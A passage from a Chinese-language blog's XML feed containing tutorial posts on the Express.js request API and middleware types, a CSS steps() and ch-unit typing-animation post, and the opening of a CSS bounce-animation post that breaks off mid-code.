class="line">req.accepts(<span class="string">'html'</span>)    <span class="comment">// =&gt; "html"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Accept : text/*,application/json</span></span><br><span class="line">req.accepts(<span class="string">'html'</span>)  <span class="comment">// =&gt; "html"</span></span><br><span class="line">req.accepts(<span class="string">'text/html'</span>) <span class="comment">// =&gt;  'text/html'</span></span><br><span class="line">req.accepts([<span class="string">'json'</span>,<span class="string">'text'</span>]) <span class="comment">// =&gt; 'json'</span></span><br><span class="line">req.accepts(<span class="string">'application/json'</span>) <span class="comment">// =&gt; 'application/json'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Accepts : text/*,application/json</span></span><br><span class="line">req.accepts(<span class="string">'image/png'</span>);</span><br><span class="line">req.accepts(<span class="string">'png'</span>)   <span class="comment">// =&gt; undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Accept: text/*;q=.5,application/json</span></span><br><span class="line">req.accepts([<span class="string">'html'</span>,<span class="string">'json'</span>]) <span class="comment">// =&gt; json</span></span><br></pre></td></tr></table></figure></p><h3 id="req-acceptsCharsets-charset-…"><a href="#req-acceptsCharsets-charset-…" class="headerlink" title="req.acceptsCharsets(charset[,…])"></a>req.acceptsCharsets(charset[,…])</h3><p>基于请求的<code>Accept-Charset</code>HTTP头字段，返回第一个接受指定字符集的字符集.如果指定的字符集都不接受，返回<code>false</code></p><h3 id="req-acceptsEncodings-encoding-…"><a href="#req-acceptsEncodings-encoding-…" class="headerlink" title="req.acceptsEncodings(encoding[,…])"></a>req.acceptsEncodings(encoding[,…])</h3><p>基于请求的<code>Accept-Encoding</code>http字段，返回第一个接受的指定编码.如果指定的编码是没有接受的，返回<code>false</code></p><h3 id="req-acceptsLanguages-lang-…"><a href="#req-acceptsLanguages-lang-…" class="headerlink" title="req.acceptsLanguages[lang[,…]]"></a>req.acceptsLanguages[lang[,…]]</h3><p>基于请求的<code>Accept-Language</code>http字段，返回指定语言的第一个已接受语言.如果没有指定的语言被接受，返回<code>fasle</code></p><h3 id="req-get-field"><a href="#req-get-field" class="headerlink" title="req.get(field)"></a>req.get(field)</h3><p>返回指定http请求头字段（大小写不敏感匹配），这个<code>Referrer</code>和<code>Referer</code>字段可以互换<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">req.get(<span class="string">'Content-Type'</span>); <span class="comment">// =&gt; 'text/plain'</span></span><br><span class="line">req.get(<span class="string">'content-type'</span>); <span class="comment">// =&gt; 'text/plain'</span></span><br><span class="line">req.get(<span class="string">'Something'</span>) <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure></p><p>别名<code>req.header(field)</code></p><h3 id="req-is-type"><a href="#req-is-type" class="headerlink" title="req.is(type)"></a>req.is(type)</h3><p>如果传入的请求的HTTP头字段与type类型的参数指定的MIME类型匹配，返回true。否者返回false<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// when content-type:text/html;charset=utf-8</span></span><br><span class="line">req.is(<span class="string">'html'</span>)</span><br><span class="line">req.is(<span class="string">'text/html'</span>)</span><br><span class="line">req.is(<span class="string">'text/*'</span>)</span><br><span class="line"><span class="comment">// =&gt; true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// when content-type is application/json</span></span><br><span class="line">req.is(<span class="string">'json'</span>)</span><br><span class="line">req.is(<span class="string">'application/json'</span>)</span><br><span class="line">req.is(<span class="string">'application/*'</span>)</span><br><span class="line"><span class="comment">// =&gt; true</span></span><br><span class="line"></span><br><span class="line">req.is(<span class="string">'html'</span>)</span><br><span class="line"><span class="comment">// =&gt; false</span></span><br></pre></td></tr></table></figure></p><h3 id="req-param-name-defaultValue"><a href="#req-param-name-defaultValue" class="headerlink" title="req.param(name,[,defaultValue])"></a>req.param(name,[,defaultValue])</h3><blockquote><p>过时的，使用<code>req.body,req.params,req.query</code>,如适用</p></blockquote><p>返回参数名的值时<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ?name=tobi</span></span><br><span class="line">req.param(<span class="string">'name'</span>)   <span class="comment">// =&gt; 'tobi'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// POST name=tobi</span></span><br><span class="line">req.param(<span class="string">'name'</span>)  <span class="comment">// =&gt; 'tobi'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /user/tobi for /user/:name</span></span><br><span class="line">req.param(<span class="string">'name'</span>) <span class="comment">// =&gt; 'tobi'</span></span><br></pre></td></tr></table></figure></p><p>按以下顺序执行查找，</p><ul><li>req.params</li><li>req.body</li><li>req.query</li></ul><blockquote><p>直接访问req.params,req.body,req.query应该是被视为清晰可赞扬的-除非你真正接受每个对象的输入。<code>Body-parsing</code>必须被加载为了<code>req.param</code>正常的使用</p></blockquote><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>Express文档中Request部分就完成了，本人学识有限，难免有所纰漏，另外翻译仅仅是方便个人学习交流使用，无其他用意，原文地址：<a href="http://www.expressjs.com.cn/4x/api.html#req" target="_blank" rel="noopener">expressjs.com</a></p>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
            <tag> express </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>express中间件，一篇文章就够了</title>
      <link href="/2017/12/18/express-middleware-use/"/>
      <url>/2017/12/18/express-middleware-use/</url>
      
        <content type="html"><![CDATA[<h1 id="底层：http模块"><a href="#底层：http模块" class="headerlink" title="底层：http模块"></a>底层：http模块</h1><p>express目前是最流行的基于Node.js的web开发框架，express框架建立在内置的http模块上，<br><a id="more"></a><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"><span class="keyword">var</span>  app = http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>,&#123;<span class="string">"Content-type"</span>:<span class="string">"text/plain"</span>&#125;);</span><br><span class="line">    res.end(<span class="string">'hello world'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>,<span class="string">'lcoalhost'</span>)</span><br></pre></td></tr></table></figure></p><p>上面代码的关键是使用<code>createServer</code>方法，生成一个HTTP的服务器实例。该方法接受一个回调函数，回调函数的参数分别代表HTTP请求和HTTP回应的<code>request</code>和<code>response</code>对象</p><p>Experss框架的核心是对http模块的再包装，<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">var</span> port  = process.env.PORT || <span class="number">3000</span></span><br><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line">app.get(<span class="string">'/'</span>,fcuntion(req,res)&#123;</span><br><span class="line">  res.send(<span class="string">'hello world'</span>)</span><br><span class="line">&#125;)</span><br><span class="line">app.listen(port)</span><br></pre></td></tr></table></figure></p><p>比较<code>http.createServer()</code>方法创建一个app实例和Express的构造方法，生成一个Express实例，两者的回调函数都是相同的。Express框架等于在http模块之上，加了一个中间层</p><h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><p>Express是一个自身功能极简单，完全由<code>路由</code>和<code>中间件</code>构成的web开发框架，从本质上说，一个Express应用是在调用各种中间件</p><p><code>中间件(middleware)</code>是一个函数,他可以访问请求对象（request object(req)）,响应对象（response object(res)）和web应用中处于请求-响应循环</p><p>Express可以使用如下几种中间件：</p><pre><code>- 应用级中间件- 路由级中间件- 错误处理中间件- 内置中间件- 第三方中间件</code></pre><h1 id="应用级中间件"><a href="#应用级中间件" class="headerlink" title="应用级中间件"></a>应用级中间件</h1><p>应用级中间键绑定到<code>app对象</code>使用<code>app.use</code>和<code>app.METHOD()-需要处理http请求的方法，例如GET、PUT、POST</code><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 没有挂载路径的中间件，应用中的每个请求都会执行该中间件</span></span><br><span class="line">app.use(<span class="function">(<span class="params">req,res,next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Time'</span>,Dtae.now());</span><br><span class="line">    next(); <span class="comment">// 传递request对象给下一个中间件</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 挂载至/user/:id的中间件，任何执行/user/:id的请求都会执行它</span></span><br><span class="line">app.use(<span class="string">'/use/:id'</span>,(req,res,next) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Request Type'</span>,req.method);</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由和句柄函数（中间件系统），处理指向/user/:id的GET请求</span></span><br><span class="line">app.get(<span class="string">'/user/:id'</span>,(req,res,next)=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'USER'</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><img src="http://www.chenqaq.com/assets/images/middlewarp1.png" alt="$ node app"><br><img src="http://www.chenqaq.com/assets/images/middlewarp2.png" alt="result"></p><p>如果我们想要<code>处理挂在至/user/:id</code>的中间件的GET请求，我们需要使用<code>next()</code>将<code>request</code>对象传递给下一个中间件</p><p>否者：<br><img src="http://www.chenqaq.com/assets/images/middlewarp3.png" alt="error"> </p><p>得不到下一个中间件处理的它，一直在等待…<br>最终会抛出localhost未发送任何数据的错误</p><p><img src="http://www.chenqaq.com/assets/images/middlewarp4.png" alt="error"></p><p>如何你不想要终止<code>请求-响应循环</code>,总是记得通过<code>next()</code>传递request对象</p><hr><p>如果你想要在中间件栈中跳过剩余中间件，调用next(‘route’)方法将控制权交给下一个路由</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'/user/:id'</span>,(req,res,next)=&gt;&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.params.id==<span class="number">0</span>) next(<span class="string">'route'</span>)</span><br><span class="line">    <span class="keyword">else</span> next()</span><br><span class="line">&#125;,(req,res,next)=&gt;&#123;</span><br><span class="line">    <span class="comment">// 渲染常规页面</span></span><br><span class="line">    res.render(<span class="string">'regular'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理/user/:id，渲染一个id为0的特殊页面</span></span><br><span class="line">app.get(<span class="string">'/user/:id'</span>,(req,res,next)=&gt;&#123;</span><br><span class="line">    res.render(<span class="string">'special'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="路由级中间件"><a href="#路由级中间件" class="headerlink" title="路由级中间件"></a>路由级中间件</h1><p>路由级中间件和应用级中间件类似，只不过是它绑定对象为<code>express.Router()</code><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> router = express.Router()</span><br></pre></td></tr></table></figure></p><p>路由级使用<code>router.use()</code>或<code>router.VERB()</code>加载</p><p>举个栗子<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line"><span class="keyword">var</span> router = express.Router()</span><br><span class="line"><span class="comment">// 没有挂载路径的中间件，通过该路由的每个请求都会执行该中间件</span></span><br><span class="line">router.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Time:'</span>, <span class="built_in">Date</span>.now());</span><br><span class="line">  next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个中间件，显示任何指向/user/:id的HTTP请求的信息</span></span><br><span class="line">router.use(<span class="string">'/user/:id'</span>,(req,res,next)=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Request URL'</span>,req.originalUrl)</span><br><span class="line">    next()</span><br><span class="line">&#125;,(req,res,next)=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Request Type'</span>,req.method)</span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个中间件栈，处理指向/user/:id的GET请求</span></span><br><span class="line">router.get(<span class="string">'/user/:id'</span>,(req,res,next)=&gt;&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.params.id == <span class="number">0</span>) next(<span class="string">'router'</span>)</span><br><span class="line">    <span class="keyword">else</span> next()</span><br><span class="line">&#125;,(req,res,next)=&gt;&#123;</span><br><span class="line">    res.render(<span class="string">'regular'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理/user/:id，渲染一个特殊页面</span></span><br><span class="line">router.get(<span class="string">'user/:id'</span>,(req,res,next)=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(req.params.id)</span><br><span class="line">    res.render(<span class="string">'special'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将路由挂载至应用</span></span><br><span class="line">app.use(<span class="string">'/'</span>,router)</span><br></pre></td></tr></table></figure></p><h1 id="错误处理中间件"><a href="#错误处理中间件" class="headerlink" title="错误处理中间件"></a>错误处理中间件</h1><blockquote><p>错误处理中间件有四个参数,定义错误处理中间件必须使用这四个参数。即使不需要next对象，也必须在参数中声明它，否者中间件会识别为一个常规中间件，不能处理错误</p></blockquote><p>举个栗子：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(<span class="function">(<span class="params">err,req,res,next</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.error(err.stack)</span><br><span class="line">    res.status(<span class="number">500</span>).send(<span class="string">'Something broke'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>中间件返回的响应是随意的，可以响应一个 HTML 错误页面、一句简单的话、一个 JSON 字符串，或者其他任何您想要的东西。</p><p>所以你可能想要像处理常规中间件那样，定义多个错误处理中间件<br>,比如您想为使用 XHR 的请求定义一个，还想为没有使用的定义一个，那么：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(logErrors)</span><br><span class="line">app.use(clientErrorHandler)</span><br><span class="line">app.use(errorHandler)</span><br></pre></td></tr></table></figure></p><p><code>logErrors</code> 将请求和错误信息写入标准错误输出、日志或者类似服务<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logErrors</span>(<span class="params">err,req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.error(err.stack)</span><br><span class="line">    next(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>clientErrorHandler</code> 定义如下(这里将错误直接传给了next)<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clientErrorHandler</span>(<span class="params">err,req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.xhr)&#123;</span><br><span class="line">        res.status(<span class="number">500</span>).send(&#123;<span class="attr">error</span>:<span class="string">'Something blew up!'</span>&#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        next(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>errorHandler</code> 捕获所有错误<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">errorHandler</span>(<span class="params">err,req,res,next</span>)</span>&#123;</span><br><span class="line">    res.status(<span class="number">500</span>)</span><br><span class="line">    res.render(<span class="string">'error'</span>,&#123;<span class="attr">error</span>:err&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="内置中间件"><a href="#内置中间件" class="headerlink" title="内置中间件"></a>内置中间件</h1><p>从版本4.x开始，Express不再依赖<code>Content</code>，除了 <code>express.static</code>, Express 以前内置的中间件现在已经全部单独作为模块安装使用</p><p><code>express.static</code>是 Express 唯一内置的中间件。<br>它基于 <code>serve-static</code>，负责在 Express 应用中提托管静态资源。</p><p>可选<code>options</code>参数拥有如下属性</p><table><thead><tr><th>属性</th><th>描述</th><th>类型</th><th>缺省值</th></tr></thead><tbody><tr><td>dotfiles</td><td>是否对外输出文件名以点（.）开头的文件。可选值为 “allow”、“deny” 和 “ignore”</td><td>String</td><td>“ignore”</td><td></td></tr><tr><td>etag</td><td>是否启用etag生成</td><td>Boolean</td><td>true</td><td></td></tr><tr><td>extensions</td><td>设置文件扩展名备份选项</td><td>Array</td><td>[ ]</td><td></td></tr><tr><td>index</td><td>发送目录索引文件，设置为 false 禁用目录索引。</td><td>mixed</td><td>“index.html”</td><td></td></tr><tr><td>lastModified</td><td>设置 Last-Modified 头为文件在操作系统上的最后修改日期</td><td>Boolean</td><td>true</td><td></td></tr><tr><td>maxAge</td><td>毫秒或者其字符串格式设置 Cache-Control 头的 max-age 属性</td><td>Number</td><td>0</td><td></td></tr><tr><td>redirect</td><td>当路径为目录时，重定向至”/“</td><td>Boolean</td><td>true</td><td></td></tr><tr><td>setHeaders</td><td>设置HTTP头以提供文件的函数</td><td>Function</td><td></td><td></td></tr></tbody></table><p>下面的栗子使用了 <code>express.static</code> 中间件，其中的 <code>options</code> 对象经过了精心的设计。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">  dotfiles: <span class="string">'ignore'</span>,</span><br><span class="line">  etag: <span class="literal">false</span>,</span><br><span class="line">  extensions: [<span class="string">'htm'</span>, <span class="string">'html'</span>],</span><br><span class="line">  index: <span class="literal">false</span>,</span><br><span class="line">  maxAge: <span class="string">'1d'</span>,</span><br><span class="line">  redirect: <span class="literal">false</span>,</span><br><span class="line">  setHeaders: <span class="function"><span class="keyword">function</span> (<span class="params">res, path, stat</span>) </span>&#123;</span><br><span class="line">    res.set(<span class="string">'x-timestamp'</span>, <span class="built_in">Date</span>.now());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(express.static(<span class="string">'public'</span>, options));</span><br></pre></td></tr></table></figure></p><p>我们总是需要使用<code>express.static</code>指定多个静态资源文件，比如：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(express.static(<span class="string">'public'</span>))</span><br><span class="line">app.use(express.static(<span class="string">'files'</span>))</span><br></pre></td></tr></table></figure></p><h1 id="第三方中间件"><a href="#第三方中间件" class="headerlink" title="第三方中间件"></a>第三方中间件</h1><p>通过使用第三方中间件从而为Express应用增加更多的功能<br>安装所需功能的node模块，并在应用中加载，可以在应用级中加载，也可以在路由级中加载</p><p>举个栗子<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ npm install cookie-parser</span><br></pre></td></tr></table></figure></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">'cookie-parser'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载用于解析cookie的中间件</span></span><br><span class="line">app.use(cookieParser())</span><br></pre></td></tr></table></figure><p><a href="http://www.expressjs.com.cn/resources/middleware.html" target="_blank" rel="noopener">express部分第三方中间件</a></p><p>参考资料</p><ul><li><a href="http://www.expressjs.com.cn/guide/using-middleware.html" target="_blank" rel="noopener">expressjs.com</a></li><li><a href="http://javascript.ruanyifeng.com/nodejs/express.html#toc6" target="_blank" rel="noopener">express框架-阮一峰老师</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
            <tag> express </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>过渡与动画 - steps调速函数&amp;CSS值与单位之ch</title>
      <link href="/2017/12/13/css-animation-frameBYframe/"/>
      <url>/2017/12/13/css-animation-frameBYframe/</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>上一篇中我们熟悉五种内置的缓动曲线和(三次)贝塞尔曲线，并且基于此完成了缓动效果.</p><p>但是如果我们想要实现逐帧动画，基于贝塞尔曲线的调速函数就显得有些无能为力了，因为我们并不需要<code>帧与帧之间的过渡状态</code>，就像上篇中所看到的，所有基于贝塞尔曲线的调速函数都会在关键帧之间进行插值运算，从而产生平滑的过渡效果。</p><p>这个特性显然很棒，平滑的效果确实是我们使用css过渡和动画所追求的。</p><p>但是在逐帧动画的场景下，这种平滑的特性恰恰毁掉了我们想要实现的逐帧动画的效果.</p><p><img src="http://www.chenqaq.com/assets/photos/yi.png" alt=""><br><a id="more"></a></p><h1 id="逐帧动画"><a href="#逐帧动画" class="headerlink" title="逐帧动画"></a>逐帧动画</h1><p>我们经常会看到一段卡通影片、一个复杂进度的提示框、一个小loading，<br>我们不会单纯的选择一张GIF动画胜任，因为它的局限性和短板表现的很明显.</p><ul><li>GIF图片所能使用的颜色数量被限制在256色</li><li>GIF不具有Alpha透明的特性，</li><li>GIF动画一旦生成，参数就固定在文件内部，只能通过图像处理软件去重新生成.<br>在某些场景下，基于图片的逐帧动画成了不错的选择。</li></ul><p><img src="http://www.chenqaq.com/assets/images/loading.jpg" alt=""></p><h1 id="steps-调速函数"><a href="#steps-调速函数" class="headerlink" title="steps()调速函数"></a>steps()调速函数</h1><p>写在前面中提到，我们不能基于贝塞尔曲线的调速函数完成我们所需要的逐帧动画，那么采用什么调速函数呢？</p><p>对，答案就是<code>steps()</code>调速函数,与贝塞尔曲线迥然不同的是，<code>steps()</code>会根据你指定的步进数量，把动画分为很多帧，而且整个动画会在<code>帧与帧之间硬切</code>,不会像贝塞尔曲线那样做插值处理。</p><p><img src="http://www.chenqaq.com/assets/images/xy.png" alt="对比step(8)、linear以及默认ease的差异"></p><p>通过上图我们可以很明显看出steps(8)、linear和ease的区别.</p><p>其实这种硬切效果是我们极力避免的，因此我们也很少听到关于<code>steps()</code>的讨论。在CSS调速函数的世界里，基于<code>贝塞尔曲线</code>的调速函数就像是被人追捧的白天鹅，而<code>steps()</code>则是旁人唯恐不及的丑小鸭。</p><p><img src="http://www.chenqaq.com/assets/photos/ch.jpg" alt=""></p><p>其实无所谓好与不好，更多的是适合与不适合，我们都崇拜的贝塞尔曲线在像小”loading”这样的逐帧动画中失败了，而<code>steps()</code>却展示出我们想要的效果.</p><p>这个想法最初是Simurai在他的博客中推出<a href="http://simurai.com/blog/2012/12/03/step-animation" target="_blank" rel="noopener">http://simurai.com/blog/2012/12/03/step-animation</a>，他使用<code>steps()</code>实现拼合图片的动画效果.让人印象深刻 </p><iframe height="265" scrolling="no" title="Steps Animation" src="//codepen.io/simurai/embed/tukwj/?height=265&theme-id=dark&default-tab=css,result&embed-version=2" frameborder="no" allowtransparency="true" allowfullscreen="true" style="width: 100%;margin-top:20px">See the Pen <a href="https://codepen.io/simurai/pen/tukwj/" target="_blank" rel="noopener">Steps Animation</a> by simurai (<a href="https://codepen.io/simurai" target="_blank" rel="noopener">@simurai</a>) on <a href="https://codepen.io" target="_blank" rel="noopener">CodePen</a>.<br></iframe><h1 id="ch单位-css值与单位第三版"><a href="#ch单位-css值与单位第三版" class="headerlink" title="ch单位 - css值与单位第三版"></a>ch单位 - css值与单位第三版</h1><p>有时候，我们希望一段为本字符逐个显示，模拟出一种打字的效果。这种效果在技术类网站中尤为常见，用等宽字体可以营造出一种终端命令行的感觉.</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>CSS is amazing!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">keyframes</span> typing&#123;</span><br><span class="line">    <span class="selector-tag">from</span>&#123;<span class="attribute">width</span>:<span class="number">0</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h1</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">7.7em</span>;</span><br><span class="line">    <span class="attribute">white-space</span>:nowrap;</span><br><span class="line">    <span class="attribute">overflow</span>:hidden;</span><br><span class="line">    <span class="attribute">animation</span>:typing <span class="number">8s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们想要模拟出一种打字效果，但是</p><ul><li>整个动画是平滑连贯的，而不是逐字显示</li><li>目前我们已经使用em指定宽度是7.7，虽然他比像素单位好一些，但是仍然不够理想，这个宽度为什么是7.7em.</li></ul><p><img src="http://www.chenqaq.com/assets/photos/mi.jpg" alt=""></p><p>我们很自然的想到了使用<code>steps()</code>来修复第一个问题，但是不幸的是，我们所需要的步进数量是由字符的数量来决定的</p><p><code>CSS值与单位(第三版)</code>规范引入了一个新的单位，表示”0”字形的宽度。大多数场景下，我们不必关心”0”字形的宽度到底有多宽，因为在等宽字体中，”0”字形的宽度和其他所有字形的宽度是一样的。因此，我们如果使用ch单位来表示h1的宽度，那取值实际上就是字符的数量：在上面的例子中就是15<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">keyframes</span> typing&#123;</span><br><span class="line">    <span class="selector-tag">from</span>&#123; <span class="attribute">width</span>:<span class="number">0</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">keyframes</span> caret&#123;</span><br><span class="line">    50%&#123; <span class="attribute">border-color</span>:transparent &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h1</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">15ch</span>;</span><br><span class="line">    <span class="attribute">overflow</span>:hidden;</span><br><span class="line">    <span class="attribute">white-space</span>:nowrap;</span><br><span class="line">    <span class="attribute">border-right</span>:<span class="number">0.5em</span> solid;</span><br><span class="line">    <span class="attribute">animation</span>:typing <span class="number">6s</span> <span class="built_in">steps</span>(15),caret <span class="number">1s</span> <span class="built_in">steps</span>(1) infinite;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>但是我们还是有些疑问：</p><ul><li><p>这样的代码是不易维护的，当更新标题的时候，我们总是需要根据字符的数量来指定不同的宽度样式和<code>steps()</code>函数，这时候正是JavaScript的用武之地</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$$</span>(<span class="params">selector,context</span>)</span>&#123;</span><br><span class="line">    context = context||<span class="built_in">document</span>;</span><br><span class="line">    <span class="keyword">var</span> elements = context.querySelector(selector);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Array</span>.prototype.slice.call(elements);</span><br><span class="line">&#125;</span><br><span class="line">$$(<span class="string">'h1'</span>).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">h1</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> len = h1.textContent.length,s = h1.style;</span><br><span class="line"></span><br><span class="line">    s.width = len + <span class="string">'ch'</span>;</span><br><span class="line">    s.animationTimingFunction = <span class="string">"steps("</span> + len + <span class="string">"),steps(1)"</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>如果浏览器不支持ch单位，我们该怎么办？这时候就需要实现样式的回退，如果不希望字体出现异常，会选择补一行em作为单位的回退样式</p></li></ul><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>这一篇主要基于<code>steps()</code>函数和<code>ch单位</code>,详细的比较了<code>steps()</code>调速函数和基于贝塞尔曲线调速函数的区别，虽然<code>steps()</code>调速函数像是旁人唯恐不及的丑小鸭，但是它亦有其独特的魅力。</p>]]></content>
      
      
      <categories>
          
          <category> HTML/CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> animation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>过渡与动画 - 缓动效果之弹跳动画&amp;弹性过渡</title>
      <link href="/2017/12/10/css-animation-easing/"/>
      <url>/2017/12/10/css-animation-easing/</url>
      
        <content type="html"><![CDATA[<h1 id="难题"><a href="#难题" class="headerlink" title="难题"></a>难题</h1><p>给过渡和动画加上缓动效果是一种常见的手法（比如具有回弹效果的过渡过程）是一种流行的表现手法，可以让界面显得更加生动和真实：在现实世界中，物体A点到B点往往也是不完全匀速的</p><p>以纯技术的角度来看，回弹效果是指当一个过渡达到最终值时，往回到一点，然后再次回到最终值，如此往复一次或者多次，并逐渐收敛，最终稳定在最终值。有相当的多JavaScript类库可以创建动画，且内置回弹效果等其他缓动效果。但是眼下，我们其实已经不需要借助脚本来实现过渡和动画了。不过，在CSS中实现回弹效果的最佳方式是什么呢？<br><a id="more"></a><br><img src="http://www.chenqaq.com/assets/images/easingP.png" alt="弹跳效果"></p><h1 id="弹跳动画"><a href="#弹跳动画" class="headerlink" title="弹跳动画"></a>弹跳动画</h1><p>我们的第一感觉可能就是使用css动画，并且设置如下关键帧：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">keyframes</span> bounce&#123;</span><br><span class="line">    60%,80%,<span class="selector-tag">to</span>&#123;<span class="attribute">transform</span>:<span class="built_in">translateY</span>(350px);&#125;</span><br><span class="line">    70%&#123;<span class="attribute">transform</span>:<span class="built_in">translateY</span>(250px);&#125;</span><br><span class="line">    90%&#123;<span class="attribute">transform</span>:<span class="built_in">translateY</span>(300px);&#125;</span><br><span 